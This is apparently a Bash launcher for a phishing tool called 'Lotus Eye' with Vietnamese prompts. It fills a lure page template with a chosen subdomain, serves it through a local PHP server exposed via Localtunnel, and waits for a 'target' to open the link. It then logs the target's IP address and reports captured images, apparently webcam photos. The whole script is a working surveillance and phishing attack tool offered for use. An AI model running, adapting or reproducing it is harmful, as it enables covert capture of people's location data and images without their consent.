#!/bin/bash
bl='\e[1;34m'
bl_bg='\e[44m' 
wht='\e[1;37m'
wht_bg='\e[47m'
re='\e[1;31m'
re_bg='\e[41m'
grn='\e[1;32m'
grn_bg='\e[42m'
del='\e[0m'
orn='\e[1;33m'
orn_bg='\e[43m'
mgt='\e[1;35m'
mgt_bg='\e[45m'
cyn='\e[1;36m'
cyn_bg='\e[46m'
ver=''
banner() {
# L1---------------------------------------------------------------------
clear 
printf "
██╗      ██████╗ ████████╗██╗   ██╗███████╗    ███████╗██╗   ██╗███████╗ ${grn} 
"
sleep 0.15
printf "\n"
# L2---------------------------------------------------------------------
clear
printf "
██╗      ██████╗ ████████╗██╗   ██╗███████╗    ███████╗██╗   ██╗███████╗ ${grn}
██║     ██╔═══██╗╚══██╔══╝██║   ██║██╔════╝    ██╔════╝╚██╗ ██╔╝██╔════╝ ${orn}    
"
sleep 0.15
printf "\n"
# L3---------------------------------------------------------------------
clear
printf "
██╗      ██████╗ ████████╗██╗   ██╗███████╗    ███████╗██╗   ██╗███████╗ ${grn}
██║     ██╔═══██╗╚══██╔══╝██║   ██║██╔════╝    ██╔════╝╚██╗ ██╔╝██╔════╝ ${orn}
██║     ██║   ██║   ██║   ██║   ██║███████╗    █████╗   ╚████╔╝ █████╗   ${bl}    
"
sleep 0.15
printf "\n"
# L4---------------------------------------------------------------------
clear
printf "
██╗      ██████╗ ████████╗██╗   ██╗███████╗    ███████╗██╗   ██╗███████╗ ${grn}
██║     ██╔═══██╗╚══██╔══╝██║   ██║██╔════╝    ██╔════╝╚██╗ ██╔╝██╔════╝ ${orn}
██║     ██║   ██║   ██║   ██║   ██║███████╗    █████╗   ╚████╔╝ █████╗   ${bl}
██║     ██║   ██║   ██║   ██║   ██║╚════██║    ██╔══╝    ╚██╔╝  ██╔══╝   ${re}   
"
sleep 0.15
printf "\n"
# L5---------------------------------------------------------------------
clear
printf "
██╗      ██████╗ ████████╗██╗   ██╗███████╗    ███████╗██╗   ██╗███████╗ ${grn}
██║     ██╔═══██╗╚══██╔══╝██║   ██║██╔════╝    ██╔════╝╚██╗ ██╔╝██╔════╝ ${orn}
██║     ██║   ██║   ██║   ██║   ██║███████╗    █████╗   ╚████╔╝ █████╗   ${bl}
██║     ██║   ██║   ██║   ██║   ██║╚════██║    ██╔══╝    ╚██╔╝  ██╔══╝   ${re}
███████╗╚██████╔╝   ██║   ╚██████╔╝███████║    ███████╗   ██║   ███████╗ ${cyn}   
"
sleep 0.15
printf "\n"
# L6---------------------------------------------------------------------
clear
printf "
██╗      ██████╗ ████████╗██╗   ██╗███████╗    ███████╗██╗   ██╗███████╗ ${grn}
██║     ██╔═══██╗╚══██╔══╝██║   ██║██╔════╝    ██╔════╝╚██╗ ██╔╝██╔════╝ ${orn}
██║     ██║   ██║   ██║   ██║   ██║███████╗    █████╗   ╚████╔╝ █████╗   ${bl}
██║     ██║   ██║   ██║   ██║   ██║╚════██║    ██╔══╝    ╚██╔╝  ██╔══╝   ${re}
███████╗╚██████╔╝   ██║   ╚██████╔╝███████║    ███████╗   ██║   ███████╗ ${cyn}
╚══════╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝    ╚══════╝   ╚═╝   ╚══════╝ ${mgt}    
"
sleep 0.15
printf "\n"
# L7---------------------------------------------------------------------
clear
printf "
██╗      ██████╗ ████████╗██╗   ██╗███████╗    ███████╗██╗   ██╗███████╗ ${grn}
██║     ██╔═══██╗╚══██╔══╝██║   ██║██╔════╝    ██╔════╝╚██╗ ██╔╝██╔════╝ ${orn}
██║     ██║   ██║   ██║   ██║   ██║███████╗    █████╗   ╚████╔╝ █████╗   ${bl}
██║     ██║   ██║   ██║   ██║   ██║╚════██║    ██╔══╝    ╚██╔╝  ██╔══╝   ${re}
███████╗╚██████╔╝   ██║   ╚██████╔╝███████║    ███████╗   ██║   ███████╗ ${cyn}
╚══════╝ ╚═════╝    ╚═╝    ╚═════╝ ╚══════╝    ╚══════╝   ╚═╝   ╚══════╝ ${mgt}${wht}BETAv1    
"
sleep 0.15
printf "                     ${re}THE EYE OF TRUTH - LE LOTUS TEAM\n"

printf "\n"
}

stop() {

checkphp=$(ps aux | grep -o "php" | head -n1)

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
exit 1

}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt

}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Đợi mục tiêu,\e[0m\e[1;77m Nhấn Ctrl + C để thoát...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Mục tiêu đã mở liên kết!\n"
catch_ip
rm -rf ip.txt

fi

sleep 1

if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Đã nhận hình ảnh!\e[0m\n"
rm -rf Log.log
fi
sleep 1

done 

}

s_tunnel() {
echo -ne "${grn}[${re}!${grn}] ${wht}Nhập subdomain muốn dùng: "
read subdomain
# Gán link
sed 's+forwarding_link+'$subdomain'+g' lotuseye.html > index2.html
sed 's+forwarding_link+'$subdomain'+g' template.php > index.php
#======================================================
printf "\e[1;92m[\e[0m+\e[1;92m] Khởi động máy chủ PHP...\n"
php -S 127.0.0.1:4444 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Khởi động máy chủ Localtunnel...\n"
lt -p 4444 -s $subdomain > /dev/null 2>&1 &
printf "[*] Domain của bạn là: \e[0m${subdomain}.loca.lt"
sleep 0.15

checkfound
}

main() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

s_tunnel
}

banner
main


